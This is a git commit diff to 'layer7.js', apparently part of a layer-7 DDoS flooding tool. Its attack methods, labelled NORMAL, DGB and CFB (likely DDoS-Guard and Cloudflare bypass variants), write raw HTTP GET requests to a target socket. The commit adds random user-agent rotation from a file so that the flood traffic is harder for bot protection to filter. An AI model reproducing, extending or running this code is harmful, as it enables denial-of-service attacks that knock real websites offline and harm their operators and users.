fb5d332674ff9eda79e1142886bff3a09155d354
Sakuzuna <nikita.kopychev@s.wingateschool.com>
2025-02-20 20:53:46 +0000

    Update layer7.js

--- src/methods/layer7.js
+++ src/methods/layer7.js
@@ -1,16 +1,23 @@
+const fs = require('fs');
+
+const userAgents = fs.readFileSync('uas.txt', 'utf8').split('\n').filter(Boolean);
+
 module.exports = {
     NORMAL: (socket, target, kbSize) => {
-        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\n\r\n`;
+        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: ${userAgent}\r\n\r\n`;
         socket.write(payload);
     },
 
     DGB: (socket, target, kbSize) => {
-        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\nAccept: */*\r\n\r\n`;
+        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\n\r\n`;
         socket.write(payload);
     },
 
     CFB: (socket, target, kbSize) => {
-        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\nAccept: */*\r\n\r\n`;
+        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\n\r\n`;
         socket.write(payload);
     },
 };
